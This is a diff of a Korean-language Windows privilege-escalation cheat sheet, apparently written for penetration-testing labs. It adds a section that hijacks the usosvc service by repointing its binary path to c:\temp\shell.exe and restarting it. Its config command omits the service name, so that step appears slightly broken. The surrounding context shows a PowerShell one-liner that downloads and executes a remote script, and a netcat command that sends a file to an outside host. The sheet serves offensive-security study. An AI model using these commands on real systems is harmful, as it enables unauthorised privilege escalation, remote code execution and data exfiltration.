@@ -67,6 +67,30 @@ powershell iex(new-object net.webclient).downloadstring("http://10.10.10.10/Invo
 </details>
 
 ---
+<details>
+ <summary><strong>Modify Service</strong></summary>
+
+- `Serivce`를 수정하여 재시작 할 수 있으면 권한 상승으로 이어질 수 있다.
+<img width="1104" height="134" alt="image" src="https://github.com/user-attachments/assets/8cf4e758-c186-41aa-ae4a-dde8860b5be1" />
+
+
+```powershell
+# SERVICE_START_NAME : 서비스 실행 유저 확인.
+sc.exe qc usosvc
+
+sc.exe stop usosvc
+
+sc.exe config binpath="c:\temp\shell.exe"
+
+# 바뀐 BINARY_PATH_NAME 확인.
+sc.exe qc usosvc
+
+sc.exe start usosvc
+```
+ 
+</details>
+
+---
 ## use nc to transfer files
 ```powershell
 nc 10.10.10.10 80 < file.txt
